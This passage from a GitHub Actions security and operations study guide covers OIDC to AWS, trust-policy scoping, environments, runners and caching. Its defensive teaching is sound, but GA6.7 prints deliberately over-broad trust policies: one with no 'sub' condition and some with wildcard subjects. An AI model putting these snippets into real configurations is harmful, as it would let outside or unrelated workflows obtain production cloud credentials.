- **The historical default is read/write on all scopes** — so **every workflow, by default, could push to the default branch, create releases, publish packages, and modify workflows.** **A script injection (GA4.9) or a compromised action (GA5.2) in any workflow inherits all of it.**
- **GitHub now defaults new organisations to read-only**, and **existing organisations may still have the permissive default.** **Checking and changing this org-wide setting is one of the highest-value single security actions available** (GA5.9).

**The practice:**

- **Set `permissions: contents: read` at the workflow level** as the baseline.
- **Grant additional scopes at job level**, only to the job that needs them — so the build job's `packages: write` isn't available to the test job.
- **`id-token: write` only where OIDC is used** (GA6.5) — it's what allows the job to request an OIDC token, and it should be narrowly granted.
- **Declaring `permissions` at all switches to explicit mode** — unlisted scopes become `none`, which is the behaviour you want.

**GA6.5 — OIDC to AWS with no stored credentials**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write          # ← required to request the OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/github-deploy
          aws-region: eu-west-1
          role-session-name: gha-${{ github.run_id }}
      - run: aws sts get-caller-identity
```

**The flow:**

1. **GitHub's OIDC provider issues a signed JWT** for the job, asserting the repository, ref, workflow, actor, and environment.
2. **The action requests that token** (needs `id-token: write`).
3. **It calls `sts:AssumeRoleWithWebIdentity`** with the token.
4. **AWS validates the signature** against GitHub's published keys, **checks the trust policy's conditions** (GA6.6), and issues temporary credentials.
5. **The credentials are exported** as environment variables for subsequent steps, and expire in an hour.

**The one-time AWS setup**: an IAM OIDC identity provider for `token.actions.githubusercontent.com` (audience `sts.amazonaws.com`), plus the role and its trust policy.

**Why it matters** (A2.8, S7.9, C10.3): **no long-lived AWS credential exists anywhere** — not in GitHub secrets, not in the workflow, not on the runner. **Nothing to rotate, nothing to leak, and revocation is a trust-policy edit rather than a key rotation across every repository.** For a platform role targeting AWS, this is the single most valuable item in the domain.

**GA6.6 — Constraining the OIDC subject**

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:acme/payments-infra:ref:refs/heads/main"
      }
    }
  }]
}
```

**The `sub` claim formats — knowing these is the practical skill:**

| Context | `sub` value |
|---|---|
| A branch | `repo:OWNER/REPO:ref:refs/heads/main` |
| A tag | `repo:OWNER/REPO:ref:refs/tags/v1.0.0` |
| **An environment** | `repo:OWNER/REPO:environment:production` |
| A pull request | `repo:OWNER/REPO:pull_request` |
| Any ref in the repo | `repo:OWNER/REPO:*` (needs `StringLike`) |

**The strongest constraint is the environment form**: `repo:acme/payments-infra:environment:production`. **Because an environment can require reviewer approval and restrict branches** (GA7.1, GA7.3), **the AWS role becomes assumable only after a human has approved the deployment** — so the approval gate is enforced by IAM, not just by GitHub's UI (C10.1's "enforced by the platform" argument).

**The other claims available for conditions**: `repository`, `repository_owner`, `job_workflow_ref` (which pins to a specific reusable workflow — useful for a shared deployment workflow), `actor`, and `environment`.

**GA6.7 — The risk of a trust policy that's too broad**

**The severity ladder, worst first:**

1. **No `sub` condition at all**, only `aud`:
   ```json
   "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" }
   ```
   **Any GitHub Actions workflow, in any repository, belonging to anyone on the internet, can assume this role.** An attacker creates a repository, adds a workflow, and has your credentials. **This is catastrophic and it appears in real configurations**, usually because someone was debugging and removed the condition to make it work.

2. **`StringLike` with a wildcard on the org**:
   ```json
   "StringLike": { "...:sub": "repo:acme/*" }
   ```
   **Any repository in the organisation can assume the role** — including a low-value repository with broad write access, or a new one created by anyone with permission. **Lateral movement within the org becomes trivial.**

3. **Repository-scoped but any ref**: `repo:acme/payments-infra:*` — **any branch**, so **anyone who can push a branch can assume the production role.** In most repositories that's a large group, and **it means a fork PR context or a feature branch gets production credentials.**

4. **Branch-scoped**: `ref:refs/heads/main` — good. Only workflows running on `main`.

5. **Environment-scoped**: `environment:production` — **best**, because it additionally requires the environment's approval and branch rules (GA6.6).

**The checks to perform**: **`StringEquals` not `StringLike` wherever possible**; **no wildcards in the middle of the `sub`**; **the `aud` condition present**; and **separate roles for plan/read and apply/write**, with the write role scoped to the protected environment (C10.3, TF7.4).

**GA6.8 — GitHub App tokens when `GITHUB_TOKEN` isn't enough**

```yaml
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    owner: ${{ github.repository_owner }}
    repositories: "other-repo,infra-repo"

- run: gh pr create --repo acme/infra-repo ...
  env:
    GH_TOKEN: ${{ steps.app-token.outputs.token }}
```

**When `GITHUB_TOKEN` is insufficient** (GA6.3):

- **Cross-repository access** — updating a manifest in a GitOps repository, triggering a workflow elsewhere, reading a private dependency.
- **Triggering other workflows** — `GITHUB_TOKEN` pushes don't trigger workflows (GA2.11); **an App token does.**
- **Higher rate limits** (GA10.6).
- **Operations requiring an app or user identity.**

**Why an App beats a PAT** — and this is the argument to make:

- **Scoped to specific repositories and specific permissions**, rather than a user's full access.
- **Short-lived installation tokens** (1 hour), generated per run, rather than a long-lived credential (S6.6).
- **Not tied to a person** — a PAT dies when the person leaves or rotates it, which is a recurring operational failure.
- **Auditable as a distinct identity** in the audit log.
- **The private key is the only stored secret**, and it can be rotated centrally.

**The remaining consideration**: the App's private key **is** a long-lived secret in GitHub, so it should be an organisation secret with a repository allowlist (GA6.1) and treated accordingly.

**GA6.9 — Why a workflow needs elevated permissions, and minimising it**

**The legitimate reasons a workflow needs more than read:**

| Need | Grant |
|---|---|
| Push a commit or tag | `contents: write` |
| Comment on a PR | `pull-requests: write` |
| Publish to GHCR | `packages: write` |
| Create a deployment status | `deployments: write` |
| Upload SARIF from a scan | `security-events: write` |
| Request an OIDC token | `id-token: write` |
| Update a check run | `checks: write` |

**Minimising the grant:**

- **Job level, not workflow level** (GA6.4) — the job that publishes gets `packages: write`; the test job gets `contents: read` only. **Most workflows grant at the top and every job inherits, which is the easy mistake.**
- **The narrowest scope that works** — `pull-requests: write` to comment, not `contents: write`.
- **Split the workflow** if one job needs much more than the others — the privileged part in its own job, ideally gated by an environment (GA7.1).
- **Prefer OIDC over a token** for cloud access (GA6.5) — that's a different credential entirely, and `id-token: write` grants only the ability to request a JWT, not any repository permission.
- **Use an App token for cross-repository** rather than a broad PAT (GA6.8).
- **Ask what a script injection would achieve** (GA4.9) — that's the practical test. If the answer is "push to main and publish a release", the permissions are too broad.

---

## GA7. Environments & deployment

**GA7.1 — Environments with protection rules**

```yaml
jobs:
  deploy:
    environment:
      name: production
      url: https://api.acme.com
    runs-on: ubuntu-latest
```

**An environment is a named deployment target with its own secrets, variables, and protection rules**, configured in repository settings.

**The protection rules available:**

- **Required reviewers** — up to 6 users or teams; the job pauses until one approves (GA7.2).
- **Wait timer** — a delay before the job proceeds, up to 30 days (GA7.2).
- **Deployment branch and tag policies** — restricting which refs can deploy (GA7.3).
- **Custom protection rules** via GitHub Apps — third-party gates (a change management system, an observability check).

**What an environment gives you beyond secrets:**

- **The approval gate is enforced by the platform**, not by convention (C10.1) — and crucially, **it can be tied to the OIDC subject** (GA6.6) so the AWS role itself is unassumable until approval.
- **A deployment record** in the repository's Deployments view, with history and status (GA7.7) — which is audit evidence (C10.7).
- **The `url:` renders as a link** on the run and on the PR.
- **Environment-scoped secrets** unavailable outside it (GA7.4).

**The design point**: **environments are the mechanism that makes production deployment governable in Actions.** Without one, a production deploy is a job like any other, with repository-level secrets available to any workflow on any branch.

**GA7.2 — Required reviewers and wait timers**

**Required reviewers**: the job enters a **waiting** state; designated reviewers get a notification and approve or reject in the run's UI. **The job's runner isn't allocated until approval**, so it doesn't consume minutes while waiting.

**The details:**

- **Up to 6 reviewers**, individuals or teams. **Any one of them approving is sufficient** — it's not all-of.
- **`prevent_self_review`** can be enabled so the person who triggered the run cannot approve it — **this is what enforces separation of duties** (C10.1), and it's off by default.
- **A rejection fails the job.**
- **Approval times out after 30 days.**
- **The approval is recorded** with who and when (C6.7).

**Wait timers**: a fixed delay before the job proceeds, with no human involvement.

**When a wait timer is useful, which is less obvious**: **a soak period between environments** — deploy to staging, wait 30 minutes, then proceed to production automatically, giving monitoring time to surface a problem (C5.7). **It's an automated gate that costs nothing and catches slow-manifesting failures**, and it's a good alternative to a human approval that adds no information.

**The judgement** (C10.2): **an approval gate adds safety only if the approver has context and can meaningfully say no.** Pair it with a job summary showing what's being deployed (GA4.6) and the canary results, or the approver is rubber-stamping.

**GA7.3 — Restricting which branches can deploy**

**Configured per environment**: **Deployment branches and tags** — either "all branches", "protected branches only", or a **selected list** of name patterns (`main`, `release/*`, `v*`).

**Why it matters:**

- **Without it, any branch can deploy to production.** A workflow with `environment: production` triggered from a feature branch gets the production secrets and the production OIDC subject. **Anyone who can push a branch can deploy**, which is a substantially larger group than intended.
- **It's the enforcement behind the OIDC environment condition** (GA6.6) — the AWS trust policy trusts `environment:production`, and the branch policy is what ensures only `main` can enter that environment.

**The combination that gives real control:**

1. **Branch protection on `main`** — required reviews, no direct pushes.
2. **Environment branch policy** restricting `production` to `main`.
3. **Required reviewers** on the environment (GA7.2).
4. **OIDC trust policy scoped to `environment:production`** (GA6.6).

**Together, deploying to production requires**: a reviewed PR merged to `main`, plus an environment approval, and the AWS credentials are unobtainable otherwise. **Each layer is enforced by a different system**, so bypassing one isn't enough — which is the defence-in-depth argument (S9.3) applied to delivery.

**GA7.4 — Environment-scoped secrets**

```yaml
jobs:
  deploy:
    environment: production        # ← this is what unlocks the secrets
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}   # environment-scoped value
```

**A secret defined on an environment is only resolvable in a job that declares that environment.** In any other job, `secrets.AWS_ROLE_ARN` is empty.

**Why this is the right pattern for per-environment credentials** (C5.11):

- **The same secret name, different values per environment** — so the workflow is identical and only the environment declaration differs, which is exactly the config-not-code principle (C5.3).
- **Access is gated by the environment's protection rules** (GA7.1) — **the production secret is genuinely unavailable until a reviewer approves.**
- **A staging job cannot accidentally use production credentials**, because it doesn't declare the production environment.

**The precedence** (GA6.1): environment overrides repository overrides organisation — so a repository-level fallback with environment-level overrides is a workable pattern, though **explicit environment secrets everywhere is clearer.**

**The stronger version**: with OIDC (GA6.5), **there's no secret at all** — the environment scoping happens in the AWS trust policy's `sub` condition (GA6.6), and GitHub holds nothing. **That's the pattern to recommend**, and environment-scoped secrets are the fallback for things OIDC can't cover.

**GA7.5 — Deployment concurrency**

```yaml
concurrency:
  group: deploy-${{ github.ref }}-production
  cancel-in-progress: false          # ← queue, never cancel
```

**Two overlapping deployments to the same environment is a genuine hazard**: they race, the later-finishing one wins non-deterministically, and in a Terraform context they collide on the state lock (TF9.4) or, without one, corrupt state (TF3.4).

**The configuration**: a concurrency group keyed on the environment, **with `cancel-in-progress: false`** so a new deployment queues rather than cancelling one in flight. **Cancelling a deployment mid-apply leaves a partially-completed change** (C9.7).

**GitHub's own environment concurrency**: environments have a built-in behaviour where a new deployment to the same environment can supersede a pending one, but **it doesn't replace explicit concurrency configuration** for the running case.

**The related considerations:**

- **Only one run can queue per group** — a third cancels the queued one. For a busy deployment pipeline that's usually correct (you want the latest), and worth knowing.
- **Key on the environment, not the ref**, for production — otherwise two branches could deploy concurrently.
- **A stuck deployment holds the group**, so a job timeout is essential (GA3.10) or subsequent deployments queue indefinitely.
- **Combine with the environment's wait timer** (GA7.2) if you want deliberate spacing.

**GA7.6 — A promotion flow across environments**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - id: push
        run: |
          # build and push once
          echo "digest=sha256:abc..." >> "$GITHUB_OUTPUT"

  deploy-staging:
    needs: build
    environment: staging
    uses: ./.github/workflows/deploy.yml
    with:
      environment: staging
      image_digest: ${{ needs.build.outputs.digest }}

  verify-staging:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - run: ./smoke-tests.sh

  deploy-production:
    needs: [build, verify-staging]
    environment: production          # ← approval gate here
    uses: ./.github/workflows/deploy.yml
    with:
      environment: production
      image_digest: ${{ needs.build.outputs.digest }}   # ← the SAME digest
```

**The properties that make this a correct promotion flow** (C1.6, C3.4):

- **Built once**, in the `build` job; **the digest is passed forward** (GA3.2) and every environment deploys **the same artefact**. **No rebuild per environment.**
- **The environment gate on production** provides the approval (GA7.2) and the credentials (GA7.4).
- **Verification between stages** gates progression (C4.8).
- **A reusable workflow** for the deployment logic itself (GA5.5), parameterised by environment.
- **The deployment is recorded** per environment (GA7.7).

**The variation for manual promotion**: a separate `workflow_dispatch` workflow (GA2.5) taking the digest as an input, so promotion is a deliberate act rather than automatic — appropriate where production releases are scheduled rather than continuous (C6.4).

**GA7.7 — The deployments API and PR status**

**Declaring `environment:` on a job creates a GitHub Deployment automatically**, with status transitions (in_progress → success/failure) and the `url:` surfaced as a link.

**For finer control, the API directly:**

```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const d = await github.rest.repos.createDeployment({
        owner: context.repo.owner, repo: context.repo.repo,
        ref: context.sha, environment: 'production',
        required_contexts: [], auto_merge: false
      });
      await github.rest.repos.createDeploymentStatus({
        owner: context.repo.owner, repo: context.repo.repo,
        deployment_id: d.data.id, state: 'success',
        environment_url: 'https://api.acme.com',
        log_url: `${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`
      });
```

**What it gives you:**

- **A deployment history per environment**, queryable via the API — **which is audit evidence** (C10.7) and the answer to "what's deployed where and when did it change" (C3.8).
- **Status surfaced on the commit and the PR** — a reviewer sees that this commit reached staging.
- **The environment URL** as a clickable link on the PR, which is how preview environments advertise themselves (C5.5).

**The complementary mechanisms for PR feedback**: **a PR comment** via `github.rest.issues.createComment` (updating an existing comment rather than appending, so the PR stays readable); **a check run** with a detailed summary; and **the job summary** (GA4.6). **For a Terraform plan, posting to the PR is the key review artefact** (TF9.2) — and the size limit means posting a summary with a link to the full run.

---

## GA8. Runners

**GA8.1 — GitHub-hosted runner types, sizes, and limits**

**The standard runners**: `ubuntu-latest` (currently 24.04), `ubuntu-22.04`, `windows-latest`, `macos-latest`, and pinned versions. **Standard Linux and Windows: 4 vCPU, 16GB RAM, 14GB SSD.** macOS is larger and considerably more expensive.

**Larger runners** (paid, organisation-configured): up to 64 vCPU, with **arm64 options** and **GPU runners**. Configured with custom labels and optionally a static IP range — **which matters for allowlisting a runner's egress at a firewall** (a real requirement for reaching a private endpoint).

**The limits that bite:**

| Limit | Value |
|---|---|
| Job execution time | **6 hours** |
| Workflow run time | 35 days (including waits) |
| Queue time before failure | 24 hours |
| **Concurrent jobs** | **Tier-dependent** — 20 for Free, 60 for Team, 180+ for Enterprise |
| macOS concurrency | Much lower, and separately capped |
| API requests per run | 1,000 (GA10.6) |
| Matrix jobs per run | 256 |

**The cost multipliers** (GA10.3): **Linux 1×, Windows 2×, macOS 10×.** That last one is the number that surprises people — a macOS test matrix is dramatically more expensive than the equivalent Linux one.

**The practical points**: **`-latest` moves** when GitHub updates the image, which occasionally breaks builds — **pinning to a specific version** (`ubuntu-22.04`) trades that risk for staleness; the image contains a large pre-installed toolset, which is why builds start fast; and **the runner image changelog** is published, which is where you look when a build breaks with no code change.

**GA8.2 — Why you'd need self-hosted runners**

The legitimate reasons:

- **Network access to private resources** — a database in a VPC, an internal registry, an on-premises system, a Kubernetes API server with no public endpoint. **The most common reason**, and the one that's genuinely unavoidable.
- **Specific hardware** — GPUs (though GitHub now offers them), unusual architectures, more CPU or memory than the hosted options.
- **Specific OS or configuration** — a specific kernel, a licensed tool, a legacy dependency.
- **Cost at very high volume** — self-hosted on spot instances can be cheaper than hosted minutes at scale (GA8.8), though **the operational cost frequently exceeds the saving.**
- **Data residency or compliance** requiring builds to run in a specific jurisdiction or on your own infrastructure (S10.4).
- **Persistent caches** for very large builds where the cold-cache cost dominates (GA9.7).
- **Long-running jobs** exceeding the 6-hour limit.

**The costs to weigh** (GA8.4, GA8.5): **you own the security**, and self-hosted runners carry serious risks that hosted ones don't; **you own patching, scaling, and availability**; and **the operational burden is ongoing**.

**The alternative worth naming first**: **GitHub's larger runners with a static IP range** solve the "needs to reach a private endpoint" case for many organisations without self-hosting — by allowlisting that range at the firewall or peering. **Ask whether that's sufficient before taking on self-hosted runners.**

**GA8.3 — Labels and groups**

```yaml
runs-on: [self-hosted, linux, x64, gpu]      # ALL labels must match
runs-on: gpu-large                            # a single custom label
runs-on:
  group: production-runners
  labels: [self-hosted, linux]
```

- **Labels** — arbitrary tags on a runner. **`runs-on` with an array requires all of them**, so it's an AND. Every self-hosted runner automatically gets `self-hosted` plus its OS and architecture.
- **Runner groups** — a collection of runners with **access policies**: which repositories and which workflows may use them.

**Why groups matter, and this is the security-relevant part**: **a runner group can be restricted to specific repositories**, so a runner with production network access isn't available to every repository in the organisation. **Without groups, any repository can schedule a job on any self-hosted runner** — which means a low-value repository can run code on a machine with production access (GA8.4).

**The practices:**

- **Groups scoped to repositories**, and ideally to specific workflows.
- **Descriptive labels** reflecting capability (`gpu`, `large`, `arm64`) rather than identity (`runner-07`).
- **Separate groups per trust level** — production-access runners separate from general build runners.
- **Never expose a self-hosted runner to public repositories** (GA8.4).

**GA8.4 — The serious security risk of self-hosted runners on public repos**

**GitHub's own documentation states this explicitly, and the reasoning is worth being able to give:**

**Anyone can open a pull request against a public repository. If that PR's workflow runs on your self-hosted runner, an attacker's code executes on your infrastructure.**

**What they get:**

- **Code execution on a machine inside your network**, potentially with access to internal systems, a VPC, or production resources (GA8.2's reason for having it).
- **Persistence**, if the runner isn't ephemeral (GA8.5) — installing a backdoor, modifying the toolchain, or poisoning caches that subsequent jobs use.
- **Credentials from previous jobs** left on disk — cloud credential files, cached tokens, Docker config, SSH keys.
- **Lateral movement** from a machine that's inside the perimeter.

**And the fork-PR protections don't help**: `pull_request` from a fork gives no secrets (GA6.2), **but the code still executes on the runner** — and the runner itself is the asset.

**The controls:**

- **Never use self-hosted runners on public repositories.** That's the primary rule.
- **If unavoidable**: require approval for all fork PRs (not just first-time contributors), use **ephemeral runners** (GA8.5), isolate them in a network segment with no access to anything valuable, and treat every run as hostile.
- **Runner groups** restricting which repositories can use them (GA8.3).
- **For private repositories the risk is lower and non-zero** — a compromised account or a malicious insider has the same path, so ephemerality and isolation still matter.

**GA8.5 — Ephemeral runners**

```bash
./config.sh --url https://github.com/acme --token "$TOKEN" --ephemeral
```

**An ephemeral runner accepts exactly one job, then deregisters and exits.** Paired with an autoscaler that provisions a fresh instance or pod per job (GA8.6).

**Why persistence is a risk** (GA1.4):

- **State carries between jobs** — files, installed packages, Docker images, environment modifications, cached credentials. **So one job can affect the next**, including jobs from different repositories on a shared runner (GA8.3).
- **A compromised job leaves a backdoor** for every subsequent job — a modified binary on `PATH`, a poisoned Docker image, a malicious git hook.
- **Credentials leak forward** — a token written to disk by one job is readable by the next.
- **Cache poisoning** (C2.4).
- **Drift** — a runner accumulates changes and stops matching its intended configuration, so builds become non-reproducible (C1.7).

**Ephemerality restores the isolation property that GitHub-hosted runners have by default** — which is why it's the single most important self-hosted runner configuration.

**The cost**: **a cold start per job** — no warm caches, image pulls each time. **Mitigated by a remote cache** (GA9.1, D3.5), a pre-baked runner image containing the common toolchain, and a warm pool of pre-provisioned instances.

**The recommendation**: **ephemeral by default; persistent only where the warm-cache benefit is measured, the trust boundary is controlled, and the runner group is restricted** (C2.7's argument).

**GA8.6 — Actions Runner Controller on Kubernetes**

```yaml
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata:
  name: acme-runners
spec:
  githubConfigUrl: https://github.com/acme
  githubConfigSecret: gha-app-credentials
  minRunners: 1
  maxRunners: 50
  runnerGroup: production-runners
  template:
    spec:
      serviceAccountName: gha-runner        # ← IRSA for cloud access (GA8.7)
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:latest
          resources:
            requests: { cpu: "2", memory: "4Gi" }
```

**ARC is the official Kubernetes-based runner autoscaler.** It listens for queued jobs and **creates a pod per job**, which is **ephemeral by construction** (GA8.5) — the pod is destroyed when the job completes.

**What it gives you:**

- **Autoscaling from zero** — no idle cost when there are no jobs (GA8.8).
- **Ephemerality by default**, which is the security property.
- **Kubernetes-native operations** — resource limits (K6.1), node selection and taints for GPU or large runners (K6.7), and standard observability.
- **IRSA or Pod Identity for cloud access** (GA8.7, A2.7).
- **Runner groups and labels** mapped to different AutoscalingRunnerSets.

**The considerations:**

- **Docker-in-Docker or a container runtime** for jobs that build images — either a DinD sidecar (privileged, D9.3) or **rootless alternatives like Kaniko or BuildKit** (D9.2's argument). **This is the main design decision** and the privileged sidecar is the easy, less safe answer.
- **Cold start latency** — pod scheduling plus image pull. `minRunners` keeps a warm pool.
- **The image needs your toolchain** — the base runner image is minimal compared with GitHub's hosted image, so most people build a custom one.
- **ARC itself is a component to operate** (K12.3) — versioning, upgrades, and its own failure modes.

**GA8.7 — Cloud access without static credentials**

**Two mechanisms, and the choice depends on the runner type:**

**1. OIDC from the job (GA6.5) — works on any runner, hosted or self-hosted.** The job requests a GitHub OIDC token and exchanges it for cloud credentials. **This is the general answer** and should be the default.

**2. Workload identity on the runner infrastructure** — for self-hosted runners:

- **ARC on EKS**: the runner pod's ServiceAccount is annotated for **IRSA** or bound via **Pod Identity** (A2.7), so the pod has an AWS identity automatically. **Any AWS SDK call in the job uses it with no configuration.**
- **EC2 runners**: an instance profile (A2.6).

**The tradeoff between them, which is the interesting part:**

- **OIDC scopes credentials per repository, branch, or environment** (GA6.6) — **fine-grained and auditable per workflow.**
- **Runner-level identity scopes credentials to the runner**, so **every job on that runner has the same access** regardless of which repository it came from. **That's coarser and, on a shared runner, a lateral movement path** — a job from a low-value repository gets the same AWS access as the production deployment job.

**The recommendation**: **use OIDC from the job even on self-hosted runners**, so the credential is scoped to the workflow rather than to the machine. **Use runner-level identity only for the runner's own needs** — pulling images, reporting metrics — with minimal permissions, and rely on OIDC for anything the job does.

**GA8.8 — Runner cost versus queue time**

**The tradeoff**: more runners cost more and reduce queue time; fewer cost less and jobs wait.

**Quantifying it** (C2.11):

```
20 engineers × 5 runs/day × 8 minutes average queue time
  = 13 engineer-hours/day of waiting
```

**Against the cost of the additional runner capacity** — which for GitHub-hosted is a per-minute charge with no idle cost, and for self-hosted is instance-hours including idle.

**The considerations per model:**

- **GitHub-hosted**: **you pay only for execution**, so queue time is a function of your **concurrency limit** (GA8.1), not of provisioning. **Raising the tier or buying larger runners is the lever**, and there's no idle waste.
- **Self-hosted, statically provisioned**: **you pay for idle**, so utilisation matters. Sizing for peak means paying for peak all the time.
- **Self-hosted, autoscaled (ARC, GA8.6)**: **scale to zero when idle**, pay for what runs, plus a cold-start delay per job. **`minRunners` trades a small idle cost for removing that latency.**
- **Spot instances** for self-hosted runners (A4.5) cut cost substantially, and **an interrupted runner kills a job**, so it suits short jobs and needs retry handling.

**The measurement to make** (C2.10): **track queue time as a first-class metric.** Rising queue time is the leading indicator of insufficient capacity, and it's the number that turns "the build feels slow" into a fundable decision. **And note that queue time is invisible in job duration** — a job showing 4 minutes may have waited 20.

**The framing**: **engineer time is almost always more expensive than runner time**, so the default should be to buy capacity — with the arithmetic to demonstrate it (C11.7).

---

## GA9. Caching & artifacts

**GA9.1 — Caching with a sensible key**

```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      node_modules
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-node-
```

**The key design, which is the whole item:**

- **`key`** is an exact match. **A hit restores and the cache is not re-saved** (it's already current).
- **A miss** means the job runs without the cache and **saves a new one under that key at the end** (on job success).
- **`restore-keys`** are **prefix** fallbacks, tried in order. **A partial hit restores the most recent matching cache**, so a dependency change reuses most of the previous cache rather than starting empty — **and a new cache is then saved under the exact key.**

**The essential technique: hash the dependency manifest into the key.** `hashFiles('**/package-lock.json')` means **a change to dependencies produces a different key, so a stale cache is structurally impossible** (C2.4). **A key that doesn't capture all the inputs is how you get wrong results**, which is far worse than a miss.

**The components to include**: `runner.os` (caches aren't portable across platforms), the language version if it affects the artefacts, and the manifest hash. **For a monorepo, scope by package** so one package's change doesn't invalidate everything.

**The caution**: **caching `node_modules` directly is riskier than caching `~/.npm`** — the installed tree can contain platform-specific compiled modules and post-install state, so a cache restored into a slightly different environment can be subtly broken. **Caching the package manager's download cache and running `npm ci` is safer**, at the cost of the install time.

**GA9.2 — Cache scope rules across branches**

**The rules, which are non-obvious and cause most "why doesn't my cache hit" confusion** (GA9.4):

- **A cache created on a branch is available to that branch and to child branches** (branches created from it).
- **A cache created on the default branch is available to all branches.**
- **A cache created on a feature branch is NOT available to other feature branches, or to the default branch.**
- **A PR can access caches from the base branch** and from its own head branch.

**The practical consequences:**

- **The first run on a new branch has no cache** unless the default branch has one matching the key or a `restore-key` prefix. **This is why `restore-keys` falling back to a broad prefix matters** — it lets a feature branch pick up `main`'s cache.
- **Populate the cache on the default branch deliberately.** A workflow running on `main` that saves a cache under a stable prefix gives every branch a warm start. **Without it, every feature branch builds cold.**
- **Two feature branches can't share** even if they'd benefit.
- **Fork PRs cannot write to the cache** at all (they can read from the base branch), which is a security boundary — **otherwise a fork PR could poison the cache** for the base repository (C2.4's cache poisoning point).

**GA9.3 — Cache size limits and eviction**

- **10 GB total per repository** (across all caches). **Not per cache.**
- **Eviction is least-recently-used** once the limit is reached — GitHub deletes the oldest-accessed caches to make room.
- **A cache untouched for 7 days is deleted** regardless of the size limit.
- **Individual caches** are limited by the total.

**The consequences that matter:**

- **A repository with many branches, each saving a large cache, evicts constantly** — so caches are frequently missing and nobody understands why (GA9.4). **A monorepo with per-package caches and many feature branches hits this quickly.**
- **A large Docker layer cache can consume the whole budget** (GA9.7) on its own.
- **A cache on a rarely-used branch expires** in a week.

**Managing it:**

- **Keep caches small** — cache the package manager's download directory rather than a full build tree.
- **Scope keys narrowly** so you're not storing near-duplicates per branch.
- **Delete caches** via `gh cache delete` or the API when a key scheme changes, rather than letting stale entries consume the budget.
- **Monitor usage** — `gh cache list` shows sizes and last-accessed times, and it's the first thing to check when hit rates drop.

**GA9.4 — Diagnosing a cache that never hits**

The checklist, in order:

1. **Read the log.** The cache action logs `Cache restored from key: ...` or `Cache not found for input keys: ...` — **which tells you exactly what it looked for.** People skip this and speculate.
2. **Is the key changing every run?** A key including `github.sha`, a timestamp, or `github.run_id` **never matches**, by construction. A surprisingly common mistake.
3. **Is `hashFiles` matching anything?** **If the glob matches no files, `hashFiles` returns an empty string** — so the key is a constant prefix and may collide or behave oddly. Test the glob.
4. **Branch scope** (GA9.2) — is the cache on a branch this run can see? **The most common structural cause**: the cache exists on a feature branch and the run is on a different one.
5. **Was it evicted?** (GA9.3) — check `gh cache list` for whether it still exists.
6. **Did the saving job succeed?** **A cache is only saved if the job succeeds** (unless you use the save/restore split actions). **A failing job never populates the cache, so a persistently-failing pipeline never warms it.**
7. **Is the path right?** Caching `~/.npm` when the package manager uses a different directory (or a different user's home in a container job, GA3.12) saves nothing useful.
8. **Are `restore-keys` present and broad enough** to give a partial hit?
9. **Platform mismatch** — a cache saved on `ubuntu-latest` restored on a different OS, if `runner.os` isn't in the key.

**And the meta-check** (C2.4): **is the cache actually saving time?** Restoring a large cache can take longer than the work it replaces. **Measure it.**

**GA9.5 — Artifacts between jobs**

```yaml
  build:
    steps:
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
          retention-days: 7
          if-no-files-found: error       # fail rather than silently uploading nothing

  deploy:
    needs: build
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist/
```

**Artifacts are how files cross the job boundary** (GA1.3) — the build output, test reports, coverage, logs, a Terraform plan file.

**The v4 changes worth knowing** (this is a currency signal):

- **Artifacts are immutable** — you cannot upload to the same name twice in a run. **v3 allowed appending; v4 errors.** This breaks matrix jobs uploading to one artifact name, and **the fix is a name per matrix leg plus `download-artifact` with a `pattern` and `merge-multiple: true`.**
- **Much faster** upload and download.
- **Immediately available** during the run, not just after it.
- **v3 is deprecated and being retired**, so a workflow still on v3 will break.

**The other points:**

- **`if-no-files-found: error`** — the default is `warn`, which silently uploads an empty artifact and produces a confusing failure downstream. **Setting it to `error` is a good default.**
- **Artifacts are not masked** (GA4.7) — a log containing a secret uploaded as an artifact is a leak.
- **Compression** happens automatically; `compression-level: 0` for already-compressed content.
- **Fork PRs can upload artifacts**, which is the mechanism behind the safe `workflow_run` pattern (GA2.4).

**GA9.6 — Artifact retention and cost**

- **Default retention: 90 days** (configurable per repository or organisation, 1–90 days for public, up to 400 for private).
- **Per-artifact override** with `retention-days:`.
- **Storage is billed** beyond the included allowance, per GB-month (GA10.3).

**Why it matters:**

- **Artifacts accumulate silently.** A repository building on every PR and every push, uploading a 200MB build output with 90-day retention, accumulates a substantial amount — **and storage cost is a recurring charge nobody notices until the bill.**
- **Log storage counts too**, and logs are retained for 90 days by default.

**The management:**

- **Short retention for ephemeral artifacts** — a PR build's output needs days, not 90. **`retention-days: 3` for PR artifacts** is a large saving.
- **Longer retention for release artifacts**, which may be needed for rollback (C3.5) — though **a container registry is the better home for a deployable artefact** (D8.5), with artifacts used for reports and intermediates.
- **Don't upload what you don't need** — the whole `node_modules`, the full build tree, or verbose logs.
- **Delete programmatically** — `gh api` or the artifacts API, in a scheduled cleanup workflow.
- **Set an organisation-wide default retention** rather than relying on per-repository discipline (GA10.5).

**GA9.7 — Caching Docker layers effectively**

```yaml
